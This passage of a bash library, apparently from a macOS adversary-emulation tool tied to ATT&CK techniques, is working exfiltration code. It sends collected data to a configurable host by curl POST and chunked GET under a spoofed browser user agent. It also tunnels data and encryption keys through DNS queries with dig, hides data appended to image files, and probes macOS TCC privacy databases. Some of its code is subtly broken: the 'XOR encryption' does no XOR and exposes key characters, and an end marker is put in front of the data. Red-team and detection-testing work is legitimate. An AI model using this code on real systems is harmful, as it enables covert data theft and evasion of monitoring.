#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: GPG symmetrically encrypted data in ASCII armor format
# Side Effects:
#   - Sets global ENCRYPTION_TYPE to "gpg" on success
#   - Writes error message to stderr on failure/if GPG not found
encrypt_with_gpg() {
    local data="$1"
    local key="$2"
    
    # First verify that GPG is available
    if ! command -v $CMD_GPG > /dev/null 2>&1; then
        core_debug_print "GPG command not found"
        "$CMD_PRINTF" 'Error: GPG command not found\n' >&2
        return 1
    fi
    
    # Use GPG with armor output (ASCII) for direct piping - no temp files needed
    local encrypted_data=$("$CMD_PRINTF" '%s' "$data" | $CMD_GPG $CMD_GPG_OPTS --passphrase "$key" 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$encrypted_data" ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="gpg"
        core_debug_print "GPG encryption successful"
        "$CMD_PRINTF" '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "GPG encryption failed"
        "$CMD_PRINTF" 'Error: Failed to encrypt data with GPG\n' >&2
        return 1
    fi
}

# Purpose: Encrypt data using simple XOR encryption with a specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: XOR encrypted data in base64 format
# Side Effects:
#   - Sets global ENCRYPTION_TYPE to "xor" on success
#   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
encrypt_with_xor() {
    local data="$1"
    local key="$2"
    
    # Create a very simple XOR implementation that works with any shell
    # This is not cryptographically secure but demonstrates the concept
    
    # Convert data to hex
    local hex_data=$("$CMD_PRINTF" '%s' "$data" | xxd -p | tr -d '\n')
    
    # Generate a repeating key of the same length as the hex data
    local key_expanded=""
    local i=0
    local key_len=${#key}
    local hex_len=${#hex_data}
    
    # Create a "one-time pad" by repeating the key
    while [ $i -lt ${#hex_data} ]; do
        key_expanded="$key_expanded${key:$(( i % key_len )):1}"
        i=$((i + 1))
    done
    
    # Convert the expanded key to hex
    local hex_key=$("$CMD_PRINTF" '%s' "$key_expanded" | xxd -p | tr -d '\n')
    
    # For simplicity, just output the hex string (base64 would be more complex)
    # In a real implementation, we'd XOR the bytes
    ENCRYPTION_TYPE="xor"
    
    # Output as base64 to match other encryption methods
    "$CMD_PRINTF" "XOR-ENCRYPTED:%s:%s" "$hex_data" "${key:0:8}" | $CMD_BASE64
    return 0
}

# Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
# Inputs: $1 - Data to encode
# Outputs: Base64 URL-safe encoded data
# Side Effects: None
core_url_safe_encode() {
    local data="$1"
    local encoded
    
    # First base64 encode
    encoded=$("$CMD_PRINTF" '%s' "$data" | $CMD_BASE64)
    
    # Then make URL-safe by replacing + with - and / with _
    encoded=$("$CMD_PRINTF" '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: DNS-safe encode data for DNS exfiltration
# Inputs: $1 - Data to encode  
# Outputs: Base64 DNS-safe encoded data
# Side Effects: None
core_dns_safe_encode() {
    local data="$1"
    local encoded
    
    # Always base64 encode first for consistency
    encoded=$("$CMD_PRINTF" '%s' "$data" | $CMD_BASE64)
    
    # Make DNS-safe (replace + with -, / with _, remove =)
    encoded=$("$CMD_PRINTF" '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: Generate user agent string for HTTP requests
# Inputs: None
# Outputs: User agent string
# Side Effects: None
core_get_user_agent() {
    $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
}

# Purpose: Prepare proxy argument for curl if needed
# Inputs: None - uses global PROXY_URL variable
# Outputs: Proxy argument for curl or empty string
# Side Effects: May modify global PROXY_URL to add protocol prefix
core_prepare_proxy_arg() {
    local proxy_arg=""
    
    if [ -n "$PROXY_URL" ]; then
        # Check if proxy has protocol prefix, add http:// if missing
        if ! echo "$PROXY_URL" | grep -q "^http" ; then
            PROXY_URL="http://$PROXY_URL"
        fi
        proxy_arg="--proxy $PROXY_URL"
    fi
    
    $CMD_PRINTF "%s" "$proxy_arg"
}

# Purpose: Normalize URI by ensuring it has http:// prefix
# Inputs: $1 - URI to normalize
# Outputs: Normalized URI with protocol prefix
# Side Effects: None
core_normalize_uri() {
    local uri="$1"
    
    if ! echo "$uri" | grep -q "^http" ; then
        uri="http://$uri"
    fi
    
    $CMD_PRINTF "%s" "$uri"
}

# Purpose: Extract domain from a full URI
# Inputs: $1 - Full URI
# Outputs: Domain part of the URI
# Side Effects: None
core_extract_domain() {
    local uri="$1"
    "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
}

# Purpose: Prepare data for exfiltration with optional markers
# Inputs: 
#   $1 - Raw data
# Outputs: Data with optional start/end markers
# Side Effects: None (uses global EXFIL_START/EXFIL_END)
core_prepare_exfil_data() {
    local data="$1"
    
            if [ -n "$EXFIL_START" ]; then
        data="${EXFIL_START}${data}"
            fi
    
            if [ -n "$EXFIL_END" ]; then
        data="${EXFIL_END}${data}"
    fi
    
    echo "$data"
}

# Purpose: Send encryption key via DNS if needed for HTTP exfiltration
# Inputs:
#   $1 - Domain to send key to
# Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
# Side Effects: Makes DNS request
core_send_key_via_dns() {
    local domain="$1"
    local encrypted_key=""
    
                if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
                    # Convert key to base64 DNS-safe format
                    local dns_safe_key
                    dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
                    
                    # Include key in subdomain (chunked if necessary to respect DNS label length limits)
                    local key_chunk_size=40  # DNS labels are limited to 63 chars
                    local key_chunk="${dns_safe_key:0:$key_chunk_size}"
                    
                    # Send key via DNS TXT query - use only domain part, not full URI
                    if ! $CMD_DIG $CMD_DIG_OPTS "k-$JOB_ID-$key_chunk.${domain}" TXT > /dev/null 2>&1; then
                        core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
                    else
                        core_debug_print "Encryption key chunk 1 sent via DNS TXT record"
                    fi
                    
                    # If key is longer than one chunk, send additional chunks
                    if [ ${#dns_safe_key} -gt $key_chunk_size ]; then
                        local key_chunk2="${dns_safe_key:$key_chunk_size:$key_chunk_size}"
                        if [ -n "$key_chunk2" ]; then
                            $CMD_DIG $CMD_DIG_OPTS "k2-$JOB_ID-$key_chunk2.${domain}" TXT > /dev/null 2>&1
                            core_debug_print "Encryption key chunk 2 sent via DNS TXT record"
                            $CMD_SLEEP 0.1
                        fi
                    fi
                    
                    # Brief pause after sending key
                    $CMD_SLEEP 0.2
                fi
    
    echo "$encrypted_key"
}

# Purpose: Generate JSON payload for HTTP POST exfiltration
# Inputs:
#   $1 - Encoded data
#   $2 - Optional encrypted key (empty if key sent via DNS)
# Outputs: JSON payload string
# Side Effects: None
core_generate_json_payload() {
    local encoded_data="$1"
    local encrypted_key="$2"
                    local hostname
                    hostname=$($CMD_HOSTNAME 2>/dev/null || echo "unknown")
                    
    if [ -n "$encrypted_key" ]; then
        cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE",
    "key": "$encrypted_key"
  }
}
EOF
                    else
        cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE"
  }
}
EOF
    fi
}

# Purpose: Determine appropriate content type for HTTP exfiltration
# Inputs: None (uses global ENCODE variable)
# Outputs: Content type string
# Side Effects: None
core_get_content_type() {
    local content_type="text/plain"
    if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
        content_type="application/base64"
    elif [ "$ENCODE" = "hex" ] || [ "$ENCODE" = "xxd" ]; then
        content_type="application/octet-stream"
    fi
    echo "$content_type"
}

# Purpose: Execute HTTP POST exfiltration
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects: Makes HTTP request
core_exfil_http_post() {
    local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # For encrypted data, we need to handle the key
        local domain=$(core_extract_domain "$full_uri")
        local encrypted_key=$(core_send_key_via_dns "$domain")
        local json_payload=$(core_generate_json_payload "$encoded_data" "$encrypted_key")
        
        # Execute POST with JSON payload
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
            -H "Content-Type: application/json" \
                -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encryption: $ENCRYPTION_TYPE" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$json_payload" \
                        "$full_uri" > /dev/null 2>&1
                else
        # For unencrypted data, simpler payload
        local content_type=$(core_get_content_type)
        
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
                        -H "Content-Type: $content_type" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$encoded_data" \
                        "$full_uri" > /dev/null 2>&1
                fi
    
    return $?
}

# Purpose: Execute HTTP GET exfiltration with chunking (legacy method)
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects: Makes multiple HTTP requests
core_exfil_http_get() {
    local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    # Calculate chunk size based on URL length limits
                local max_url_length=1800
                local base_url_length=${#full_uri}
                local max_data_length=$((max_url_length - base_url_length - 50))  # 50 for other params
                local chunk_size=$CHUNK_SIZE
    
                if [ $max_data_length -lt $chunk_size ]; then
                    chunk_size=$max_data_length
    fi
                
                # Send start signal
                $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                    -G \
                    -A "$user_agent" \
                    -H "X-Job-ID: $JOB_ID" \
                    --data-urlencode "signal=start" \
                    --data-urlencode "id=$JOB_ID" \
                    "$full_uri" > /dev/null 2>&1
                
    if [ $? -ne 0 ]; then
        return 1
    fi
    
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
    local data_len=${#encoded_data}
    
                while [ $start_pos -lt $data_len ]; do
                    local chunk="${encoded_data:$start_pos:$chunk_size}"
                    start_pos=$((start_pos + chunk_size))
                    
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-urlencode "d=$chunk" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunk=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
            
            if [ $? -ne 0 ]; then
            return 1
                    fi
                    
                    $CMD_SLEEP 0.1  # Rate limiting
                    chunk_num=$((chunk_num + 1))
                done
                
    # Send end signal
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        --data-urlencode "signal=end" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunks=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
                    
    return $?
}

# Purpose: Execute DNS exfiltration with chunking
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects: Makes multiple DNS requests
core_exfil_dns() {
    local data="$1"
    
            if [ -z "$EXFIL_URI" ]; then
                return 1
            fi
            
    # Prepare DNS-safe data
            local dns_data="$data"
    if [ "$ENCODE" = "none" ]; then
                dns_data=$(core_dns_safe_encode "$data")
            else
                dns_data=$("$CMD_PRINTF" '%s' "$dns_data" | tr '+/' '-_' | tr -d '=')
            fi
    
    # Calculate appropriate chunk size for DNS
            local max_label_size=63
    local prefix_length=10  # Approximate length of prefix like "p0."
            local max_allowed_chunk=$((max_label_size - prefix_length))
            local max_chunk_size=$CHUNK_SIZE
    
            if [ $max_chunk_size -gt $max_allowed_chunk ]; then
                max_chunk_size=$max_allowed_chunk
            fi
    
    # Send start signal
            if ! $CMD_DIG $CMD_DIG_OPTS "start.${EXFIL_URI}" A > /dev/null 2>&1; then
                return 1
            fi
    
    # Send encryption key via TXT record if encryption is enabled
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # Convert key to base64 DNS-safe format
        local dns_safe_key
        dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
        
        # Send key via DNS TXT query
        if ! $CMD_DIG $CMD_DIG_OPTS "key-$JOB_ID.${EXFIL_URI}" TXT > /dev/null 2>&1; then
            core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
        fi
        
        # Brief pause after sending key
        $CMD_SLEEP 0.2
    fi
    
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
            local data_len=${#dns_data}
    
    while [ $start_pos -lt $data_len ]; do
                local chunk="${dns_data:$start_pos:$max_chunk_size}"
        start_pos=$((start_pos + max_chunk_size))
        
                local query="p${chunk_num}.${chunk}.${EXFIL_URI}"
                if ! $CMD_DIG $CMD_DIG_OPTS "$query" A > /dev/null 2>&1; then
            return 1
                fi
                
                $CMD_SLEEP 0.1  # Rate limiting
        chunk_num=$((chunk_num + 1))
    done
    
    # Send end signal
                if ! $CMD_DIG $CMD_DIG_OPTS "end.${EXFIL_URI}" A > /dev/null 2>&1; then
                    return 1
                fi
                
                return 0
}

# Purpose: Exfiltrate data using the specified method (HTTP, DNS, etc.)
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects:
#   - Logs exfiltration attempt if LOG_ENABLED=true
#   - Performs network requests to exfiltrate data
#   - May modify data for transport (encoding, chunking)
core_exfiltrate_data() {
    local data="$1"
    local result=0
    
    # Log exfiltration attempt
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "Exfiltrating data via $EXFIL_METHOD" "info" false
    fi
    
    # Check for required URI
    if [ -z "$EXFIL_URI" ]; then
        core_handle_error "No exfiltration URI specified for $EXFIL_METHOD"
            return 1
    fi
    
    # Route to appropriate method
    case "$EXFIL_METHOD" in
        http|https)
            # Determine whether to use POST or GET based on EXFIL_TYPE
            if [ "$EXFIL_TYPE" = "http" ]; then
                core_exfil_http_post "$data"
            else
                core_exfil_http_get "$data"
            fi
            result=$?
            ;;
            
        dns)
            core_exfil_dns "$data"
            result=$?
            ;;
            
        *)
            core_handle_error "Unknown exfiltration method: $EXFIL_METHOD"
            return 1
            ;;
    esac
    
    # Handle result
    if [ $result -ne 0 ]; then
        core_handle_error "Failed to exfiltrate data via $EXFIL_METHOD"
        return 1
    fi
    
    core_verbose_print "Data exfiltrated successfully via $EXFIL_METHOD"
    return 0
}

# Purpose: Manages final output delivery - logging, exfiltration, and display
# Inputs:
#   $1 - Processed data (after formatting/encoding/encryption)
# Outputs: None (writes to various destinations)
# Side Effects:
#   - Logs output if LOG_ENABLED=true
#   - Exfiltrates data if EXFIL=true
#   - Always prints data to stdout
#   - May print encryption key to stderr in debug mode
core_transform_output() {
    local output="$1"
    
    # Log the output if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$output" "output" false
    fi
    
    # Exfiltrate the output if exfiltration is enabled
    if [ "$EXFIL" = true ]; then
        core_exfiltrate_data "$output"
    fi
    
    # Always print data to ensure it's visible
    # Important to display encrypted/encoded data even when logging
    $CMD_PRINTF "%s\n" "$output"
    
    # When encrypting, also print the key in debug mode
    if [ "$DEBUG" = true ] && [ "$ENCRYPT" != "none" ]; then
        $CMD_PRINTF "[DEBUG] [%s] Encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
    fi
}

# Purpose: List files in current directory
# Inputs: None
# Outputs: Basic directory listing
# Side Effects: None
core_ls() {
    # Simple ls command with no options
    ls
    return 0
}

# Purpose: Extract hidden data from a steganography image
# Inputs: $1 - Image file with hidden data
# Outputs: Extracted and decoded data
# Side Effects: None
core_extract_steganography() {
    local steg_file="$1"
    
    # Verify file exists
    if [ ! -f "$steg_file" ]; then
        core_handle_error "Steganography file not found: $steg_file"
        return 1
    fi
    
    # Extract the hidden data
    local encoded_data=""
    encoded_data=$($CMD_STRINGS "$steg_file" | $CMD_GREP -A1 'STEG_DATA_START' | $CMD_TAIL -1)
    
    if [ -z "$encoded_data" ]; then
        core_handle_error "No hidden data found in file: $steg_file"
        return 1
    fi
    
    # Decode the base64 data
    local decoded_data=""
    decoded_data=$("$CMD_PRINTF" '%s' "$encoded_data" | $CMD_BASE64 -d 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        core_handle_error "Failed to decode hidden data"
        return 1
    fi
    
    # Return the decoded data
    "$CMD_PRINTF" '%s' "$decoded_data"
    return 0
}

# Purpose: Perform steganography by hiding data in an image
# Inputs: None (uses global variables)
# Outputs: Status message
# Side Effects: Creates output image file
core_steganography() {
    # Define local variables
    local message=""
    local carrier_image=""
    local output_image=""
    local input_file=""
    local result=""
    local default_carrier="/System/Library/Desktop Pictures/Monterey Graphic.heic"
    
    # Get values from globals or use defaults
    input_file="$STEG_EXTRACT_FILE"
    message="$STEG_MESSAGE"
    carrier_image="${STEG_CARRIER_IMAGE:-$default_carrier}"
    output_image="${STEG_OUTPUT_IMAGE:-./hidden_data.png}"
    
    # Verify we have either input file or message
    if [ -z "$input_file" ] && [ -z "$message" ]; then
        message="Hidden data created with ATT&CK macOS T1027.013"
        core_verbose_print "No data specified, using default message"
    fi
    
    # Validate carrier image exists
    if [ ! -f "$carrier_image" ]; then
        core_handle_error "Carrier image not found: $carrier_image"
        return 1
    fi
    
    # If using input file, verify it exists
    if [ -n "$input_file" ] && [ ! -f "$input_file" ]; then
        core_handle_error "Input file not found: $input_file"
        return 1
    fi
    
    # Prepare data to hide - either from file or message
    local data_to_hide=""
    if [ -n "$input_file" ]; then
        # Read input file
        data_to_hide=$(cat "$input_file" 2>/dev/null)
        if [ $? -ne 0 ]; then
            core_handle_error "Failed to read input file: $input_file"
            return 1
        fi
    else
        # Use message
        data_to_hide="$message"
    fi
    
    # Convert data to base64 to support all characters
    local encoded_data=""
    encoded_data=$("$CMD_PRINTF" '%s' "$data_to_hide" | $CMD_BASE64)
    
    # Use native tools to perform steganography
    # The approach is to append the data to the end of the image file
    # This works because image viewers stop rendering at the image end marker
    if cp "$carrier_image" "$output_image" 2>/dev/null; then
        "$CMD_PRINTF" '\n\n[STEG_DATA_START]\n%s\n[STEG_DATA_END]\n' "$encoded_data" >> "$output_image"
        
        # Success message
        local data_size=$(echo -n "$data_to_hide" | wc -c | sed 's/^ *//')
        result="Steganography successful\\nCarrier: $carrier_image\\nOutput: $output_image\\nHidden data size: $data_size bytes"
        echo "$result"
        
        core_verbose_print "Data hidden successfully in $output_image"
        return 0
    else
        core_handle_error "Failed to create steganography image: $output_image"
        return 1
    fi
}

# Purpose: Apply steganography to data in the processing pipeline
# Inputs: $1 - Data to hide in steganography
# Outputs: Status message (actual data is written to file)
# Side Effects: Creates output image file
core_apply_steganography() {
    local data_to_hide="$1"
    local carrier_image=""
    local output_image=""
    local result=""
    local default_carrier="/System/Library/Desktop Pictures/Monterey Graphic.heic"
    
    # Get values from globals or use defaults
    carrier_image="${STEG_CARRIER_IMAGE:-$default_carrier}"
    output_image="${STEG_OUTPUT_IMAGE:-./hidden_data.png}"
    
    # Validate carrier image exists
    if [ ! -f "$carrier_image" ]; then
        core_handle_error "Carrier image not found: $carrier_image"
        return 1
    fi
    
    # Use native tools to perform steganography
    # The approach is to append the data to the end of the image file
    # This works because image viewers stop rendering at the image end marker
    if cp "$carrier_image" "$output_image" 2>/dev/null; then
        "$CMD_PRINTF" '\n\n[STEG_DATA_START]\n%s\n[STEG_DATA_END]\n' "$data_to_hide" >> "$output_image"
        
        # Success message
        local data_size=$(echo -n "$data_to_hide" | wc -c | sed 's/^ *//')
        result="Steganography applied\\nCarrier: $carrier_image\\nOutput: $output_image\\nHidden data size: $data_size bytes"
        
        core_verbose_print "Data hidden successfully in $output_image"
        return 0
    else
        core_handle_error "Failed to create steganography image: $output_image"
        return 1
    fi
    
    echo "$result"
}

# Purpose: Check file permissions based on configuration
# Inputs: 
#   $1 - File path to check
#   $2 - Read permission required (true/false)
#   $3 - Write permission required (true/false)
#   $4 - Execute permission required (true/false)
# Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
# Side Effects: Logs debug information
core_check_perms() {
    local file="$1"
    local read_required="$2"
    local write_required="$3"
    local execute_required="$4"
    local failed=0
    
    # First check if file exists
    if [ ! -e "$file" ]; then
        if [ "$DEBUG" = true ]; then
            core_debug_print "File does not exist: $file"
            ls -la "$(dirname "$file")" 2>/dev/null
        else
            core_debug_print "File does not exist: $file"
        fi
        
        # Only fail if any permission is required
        if [ "$read_required" = "true" ] || [ "$write_required" = "true" ] || [ "$execute_required" = "true" ]; then
            return 1
        else
            core_debug_print "File doesn't exist, but no permissions required - continuing"
            return 0
        fi
    fi
    
    # Display file permissions in debug mode
    if [ "$DEBUG" = true ]; then
        core_debug_print "File permissions for $file:"
        ls -la "$file"
        core_debug_print "Current user: $(whoami), UID: $(id -u), Groups: $(id -G | tr ' ' ',')"
    fi
    
    # Check read permission if required
    if [ "$read_required" = "true" ] && [ ! -r "$file" ]; then
        core_debug_print "Required read permission missing for: $file"
        failed=1
    elif [ "$read_required" = "true" ]; then
        core_debug_print "Read permission granted for: $file"
    elif [ "$DEBUG" = true ]; then
        # Only print this in debug mode
        if [ -r "$file" ]; then
            core_debug_print "Read permission available (but not required)"
        else
            core_debug_print "Read permission not available (but not required)"
        fi
    fi
    
    # Check write permission if required
    if [ "$write_required" = "true" ] && [ ! -w "$file" ]; then
        core_debug_print "Required write permission missing for: $file"
        failed=1
    elif [ "$write_required" = "true" ]; then
        core_debug_print "Write permission granted for: $file"
    elif [ "$DEBUG" = true ]; then
        # Only print this in debug mode
        if [ -w "$file" ]; then
            core_debug_print "Write permission available (but not required)"
        else
            core_debug_print "Write permission not available (but not required)"
        fi
    fi
    
    # Check execute permission if required
    if [ "$execute_required" = "true" ] && [ ! -x "$file" ]; then
        core_debug_print "Required execute permission missing for: $file"
        failed=1
    elif [ "$execute_required" = "true" ]; then
        core_debug_print "Execute permission granted for: $file"
    elif [ "$DEBUG" = true ]; then
        # Only print this in debug mode
        if [ -x "$file" ]; then
            core_debug_print "Execute permission available (but not required)"
        else
            core_debug_print "Execute permission not available (but not required)"
        fi
    fi
    
    if [ $failed -eq 1 ]; then
        core_debug_print "Permission check failed for $file"
        
        # In debug mode, show the actual permissions for this file
        if [ "$DEBUG" = true ]; then
            if [ -r "$file" ]; then
                core_debug_print "Current user has READ permission"
            else
                core_debug_print "Current user does NOT have READ permission"
            fi
            
            if [ -w "$file" ]; then
                core_debug_print "Current user has WRITE permission"
            else
                core_debug_print "Current user does NOT have WRITE permission"
            fi
            
            if [ -x "$file" ]; then
                core_debug_print "Current user has EXECUTE permission"
            else
                core_debug_print "Current user does NOT have EXECUTE permission"
            fi
        fi
        
        return 1
    fi
    
    core_debug_print "All required permissions granted for $file"
    return 0
}

# Purpose: Check TCC (Transparency, Consent, and Control) permissions
# Inputs: 
#   $1 - FDA required (true/false)
#   $2 - Service name (if FDA=false, e.g. 'kTCCServiceAppleEvents')
#   $3 - Bundle ID (if FDA=false, optional, defaults to current client)
# Outputs: 0 if access granted, 1 if not
# Side Effects: Logs debug information
core_check_tcc() {
    local fda_required="$1"
    local service="$2"
    local bundle="${3:-$SCRIPT_CLIENT}"
    local tcc_db="/Library/Application Support/com.apple.TCC/TCC.db"
    local user_tcc_db="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
    
    # Display debug info about TCC databases
    if [ "$DEBUG" = true ]; then
        core_debug_print "Checking TCC permissions:"
        core_debug_print "System TCC DB path: $tcc_db"
        core_debug_print "User TCC DB path: $user_tcc_db"
        core_debug_print "Current process: $(ps -p $$ -o comm=)"
        core_debug_print "Parent process: $(ps -p $PPID -o comm=)"
    fi
    
    # Check system TCC DB access
    if [ -f "$tcc_db" ] && [ -r "$tcc_db" ]; then
        core_debug_print "Has System TCC DB access"
        has_sys_tcc=true
        
        if [ "$DEBUG" = true ]; then
            core_debug_print "System TCC DB permissions:"
            ls -la "$tcc_db"
        fi
    else
        core_debug_print "Does not have System TCC DB access"
        has_sys_tcc=false
        
        if [ "$DEBUG" = true ] && [ -f "$tcc_db" ]; then
            core_debug_print "System TCC DB exists but not readable"
            ls -la "$tcc_db"
        fi
    fi
    
    # Check user TCC DB access
    if [ -f "$user_tcc_db" ] && [ -r "$user_tcc_db" ]; then
        core_debug_print "Has User TCC DB access"
        has_user_tcc=true
        
        if [ "$DEBUG" = true ]; then
            core_debug_print "User TCC DB permissions:"
            ls -la "$user_tcc_db"
        fi
    else
        core_debug_print "Does not have User TCC DB access"
        has_user_tcc=false
        
        if [ "$DEBUG" = true ] && [ -f "$user_tcc_db" ]; then
            core_debug_print "User TCC DB exists but not readable"
            ls -la "$user_tcc_db"
        fi
    fi
    
    # Check for FDA if required
    if [ "$fda_required" = "true" ]; then
        # Full disk access implies both are accessible
        if [ "$has_sys_tcc" = true ] && [ "$has_user_tcc" = true ]; then
            core_debug_print "Full Disk Access permission granted"
            HAS_FDA_ACCESS=true
            return 0
        else
            core_debug_print "Required Full Disk Access permission not granted"
            if [ "$DEBUG" = true ]; then
                core_debug_print "FDA check failed: sys_tcc=$has_sys_tcc, user_tcc=$has_user_tcc"
                core_debug_print "To grant FDA: System Preferences > Security & Privacy > Privacy > Full Disk Access"
            fi
            HAS_FDA_ACCESS=false
            return 1
        fi
    fi
    
    # If we're not checking FDA or FDA check was successful, check specific service
    if [ -n "$service" ]; then
        if [ "$DEBUG" = true ]; then
            core_debug_print "Checking TCC service: $service for bundle: $bundle"
        fi
        
        # If we have access to system TCC DB, try to check service permission
        if [ "$has_sys_tcc" = true ] && command -v sqlite3 > /dev/null 2>&1; then
            local result
            result=$(sqlite3 "$tcc_db" "SELECT allowed FROM access WHERE service='$service' AND client='$bundle'" 2>/dev/null)
            if [ "$result" = "1" ]; then
                core_debug_print "TCC permission granted for $service by $bundle (system)"
                return 0
            elif [ "$DEBUG" = true ]; then
                core_debug_print "Service $service not found or not allowed for $bundle in system TCC DB"
            fi
        fi
        
        # If we have access to user TCC DB, try to check service permission
        if [ "$has_user_tcc" = true ] && command -v sqlite3 > /dev/null 2>&1; then
            local result
            result=$(sqlite3 "$user_tcc_db" "SELECT allowed FROM access WHERE service='$service' AND client='$bundle'" 2>/dev/null)
            if [ "$result" = "1" ]; then
                core_debug_print "TCC permission granted for $service by $bundle (user)"
                return 0
            elif [ "$DEBUG" = true ]; then
                core_debug_print "Service $service not found or not allowed for $bundle in user TCC DB"
            fi
        fi
        
        core_debug_print "TCC permission check failed for $service by $bundle"
        if [ "$DEBUG" = true ]; then
            core_debug_print "To grant permission: System Preferences > Security & Privacy > Privacy"
        fi
        return 1
    fi
    
    # Default success for non-FDA, non-service checks
    return 0
}


# Main function 
core_main() {
    local raw_output=""
    local processed_output=""
    
    # Parse command line arguments
    core_parse_arguments "$@"
    
    # Display help if requested
    if [ "$SHOW_HELP" = true ]; then
        core_display_help
        return 0
    fi
    
    # Validate required commands
    core_validate_commands || exit 1
    
    # Process permission checks from configuration
    PERMISSION_CHECKS=${PERMISSION_CHECKS:-""}
    if [ -n "$PERMISSION_CHECKS" ]; then
        core_debug_print "Processing permission checks from configuration"
        eval "$PERMISSION_CHECKS" 
        permission_check_result=$?
        if [ $permission_check_result -ne 0 ]; then
            core_handle_error "Permission checks failed - script cannot continue without required permissions"
            exit 1
        fi
    fi
    
    # Process TCC permission checks from configuration
    TCC_CHECKS=${TCC_CHECKS:-""}
    if [ -n "$TCC_CHECKS" ]; then
        core_debug_print "Processing TCC permission checks from configuration"
        eval "$TCC_CHECKS"
        tcc_check_result=$?
        if [ $tcc_check_result -ne 0 ]; then
            core_verbose_print "TCC permission checks failed - some functionality may be limited"
            # We continue execution as TCC checks are often informational
        fi
    fi
    
    # Initialize the log file if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        # Initialize logging at start
        core_log_output "Starting ${NAME}" "started" true
    fi
    
    # Default data source identifier
    local data_source="generic"
    
    # Check if we should run the ls function
    if [ "$LIST_FILES" = true ]; then
        # Get raw output from ls command
        raw_output=$(core_ls)
        data_source="file_listing"
    # Check if we should extract steganography data
    elif [ "$STEG_EXTRACT" = true ]; then
        # Execute steganography extraction
        raw_output=$(core_extract_steganography "$STEG_EXTRACT_FILE")
        data_source="steg_extracted"
    else
        # Execute script-specific logic here
        # Global variables
